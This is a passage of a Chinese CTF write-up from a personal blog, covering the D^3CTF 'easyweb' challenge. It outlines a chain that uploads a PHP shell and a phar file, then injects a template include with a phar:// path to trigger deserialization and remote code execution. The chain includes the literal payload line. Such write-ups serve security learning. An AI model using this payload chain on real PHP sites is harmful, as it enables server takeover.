class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="RCE步骤"><a href="#RCE步骤" class="headerlink" title="RCE步骤"></a>RCE步骤</h4><p>（1）上传后缀名为<code>_result.php</code>的shell文件，得知shell文件绝对路径</p>
+<p>（2）上传phar文件，得知phar文件绝对路径</p>
+<p>（3）通过二次注入写入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;include file=&quot;php:phar:///tmp/xxx/xxx.phar&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>触发phar反序列化</p>
+<p>（4）RCE</p>
+<h4 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h4><p><img src="../../../../img/d3/85.png" alt=""></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/12/12/D%5E3ctf-easyweb/">https://nikoeurus.github.io/2019/12/12/D%5E3ctf-easyweb/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2019/12/12/ThinkPHP%206.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%89)/"><span>ThinkPHP 6.0.x反序列化(三)</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
+  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
+  placeholder:'Just go go',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
